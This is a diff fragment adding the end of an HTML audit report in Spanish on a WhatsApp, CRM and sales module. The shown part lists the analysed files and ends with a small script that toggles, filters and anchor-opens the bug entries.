+  <p>Paula W19 — Audit completo del módulo WhatsApp, CRM & Ventas</p>
+  <p>30 bugs (10 Critical + 20 High) | Sesión 09/04/2026</p>
+  <p>Archivos analizados: steve-wa-chat.ts, send-message.ts, send-campaign.ts, status-callback.ts, prospect-crm.ts, sales-tasks.ts, sellers.ts, proposals.ts, web-forms.ts, prospect-trial.ts, wa-action-processor.ts, prospect-followup.ts, abandoned-cart-wa.ts, onboarding-wa.ts, prospect-email-nurture.ts, sales-learning-loop.ts, churn-detector.ts, merchant-upsell.ts, booking-api.ts, steve-sales-deck.ts, prospect-event-logger.ts + 12 frontend components</p>
+</div>
+
+<script>
+function toggleAll(open) {
+  document.querySelectorAll('.bug').forEach(b => {
+    if (open) b.classList.add('open');
+    else b.classList.remove('open');
+  });
+}
+
+function filterSev(sev) {
+  document.querySelectorAll('.bug').forEach(b => {
+    if (sev === 'all') {
+      b.style.display = '';
+    } else if (sev === 'critical') {
+      b.style.display = b.classList.contains('critical') ? '' : 'none';
+    } else if (sev === 'high') {
+      b.style.display = b.classList.contains('high') ? '' : 'none';
+    }
+  });
+}
+
+// Abrir bug si se llega por anchor
+if (window.location.hash) {
+  const el = document.querySelector(window.location.hash);
+  if (el) { el.classList.add('open'); el.scrollIntoView(); }
+}
+</script>
+</body>
+</html>
